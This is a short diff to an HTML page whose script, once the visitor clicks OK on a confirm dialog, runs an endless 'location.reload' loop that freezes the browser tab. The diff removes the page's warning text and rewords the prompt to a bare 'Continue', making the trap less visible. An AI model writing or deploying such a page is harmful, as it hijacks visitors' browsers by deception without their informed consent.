@@ -3,11 +3,6 @@
 <body>
 
 
-<h2>Are you sure you wanna do this</h2>
-
-
-<p>Hit Ok if you're sure about this</p>
-
 
 <p id="demo"></p>
 
@@ -16,7 +11,7 @@
 onbeforeunload = function(){localStorage.x=1};
 
 
-if(confirm("continue to website")){
+if(confirm("Continue")){
   setTimeout(function(){
     while(1)location.reload(1)
   }, 1000)
